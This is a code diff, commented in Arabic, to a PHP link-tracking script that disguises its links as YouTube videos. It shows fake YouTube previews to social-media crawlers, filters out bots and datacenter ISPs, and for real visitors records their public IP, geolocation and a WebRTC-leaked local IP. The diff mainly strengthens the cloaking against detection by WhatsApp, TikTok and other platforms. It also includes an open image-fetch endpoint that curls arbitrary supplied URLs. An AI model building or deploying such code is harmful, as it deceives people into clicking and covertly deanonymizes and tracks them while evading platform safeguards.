@@ -13,7 +13,15 @@ session_start();
 // IMAGE GENERATOR (Very Fast)
 // ==============================================================================
 if (isset($_GET['proxy_img'])) {
-    $img_url = base64_decode($_GET['proxy_img']);
+    // إصلاح ترميز الصورة لضمان عدم كسر الرابط
+    $img_url = base64_decode(urldecode($_GET['proxy_img']));
+    
+    // إذا فشل الرابط، استخدم صورة افتراضية
+    if (empty($img_url) || !filter_var($img_url, FILTER_VALIDATE_URL)) {
+        header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
+        exit;
+    }
+
     $ch = curl_init($img_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -53,6 +61,7 @@ if (isset($_GET['proxy_img'])) {
             exit;
         }
     }
+    // إذا فشلت المعالجة، أرسل الصورة الأصلية مباشرة
     if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
     exit;
@@ -142,7 +151,8 @@ function fetch_youtube_meta($url) {
 
     // Default thumbnail (guaranteed to exist) if we have an ID
     if ($video_id) {
-        $meta['image'] = "https://img.youtube.com/vi/{$video_id}/maxresdefault.jpg";
+        // استخدام hqdefault لأنها متوفرة 100% ولا تعطي خطأ 404 مثل maxresdefault
+        $meta['image'] = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
     }
 
     // Primary: YouTube oEmbed
@@ -186,7 +196,6 @@ function fetch_youtube_meta($url) {
     return $meta;
 }
 
-// تعديل 1: دالة جلب الـ IP الحقيقي
 function get_real_ip() {
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
         return $_SERVER['HTTP_CF_CONNECTING_IP'];
@@ -267,21 +276,27 @@ if (isset($_GET['r'])) {
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         
-        // تعديل 2: إضافة بوتات تيك توك للفلتر
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktokbot/i', $ua);
+        // فلتر شامل لجميع بوتات المعاينة بما فيها تيك توك
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktok/i', $ua);
 
         if ($is_bot) {
-            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
+            // ترميز الصورة بطريقة آمنة لا تكسر الرابط
+            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
             
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
+            echo '<meta charset="UTF-8">';
             echo '<meta property="og:site_name" content="YouTube">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta property="og:description" content="Watch this video on YouTube">'; // تمت الإضافة لتحسين المعاينة
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
+            echo '<meta property="og:image:type" content="image/jpeg">';
             echo '<meta property="og:type" content="video.other">';
+            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
+            
             if (!empty($video_embed_url)) {
                 echo '<meta property="og:video" content="' . htmlspecialchars($video_embed_url) . '">';
                 echo '<meta property="og:video:secure_url" content="' . htmlspecialchars($video_embed_url) . '">';
@@ -296,6 +311,7 @@ if (isset($_GET['r'])) {
                 echo '<meta name="twitter:card" content="summary_large_image">';
             }
             echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta name="twitter:description" content="Watch this video on YouTube">';
             echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '</head><body></body></html>';
             exit();
@@ -316,7 +332,7 @@ if (isset($_GET['r'])) {
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
-            // تعديل 3: إضافة سيرفرات Byteplus وغيرها لقائمة الحظر
+            // إضافة سيرفرات Byteplus وغيرها لقائمة الحظر لعدم تسجيل بيانات المعاينة كزيارات
             $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter', 'Byteplus', 'Bytedance', 'TikTok', 'DigitalOcean', 'OVH', 'Hetzner', 'Linode', 'Alibaba', 'Tencent'];
             foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit; }
             
@@ -372,7 +388,7 @@ if (isset($_GET['r'])) {
         function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
-            // تعديل 4: منع المتصفحات الوهمية (البوتات) من تنفيذ الكود
+            // منع المتصفحات الوهمية (البوتات) من تنفيذ الكود
             if (navigator.webdriver) {
                 window.location.replace(targetUrl);
                 return;
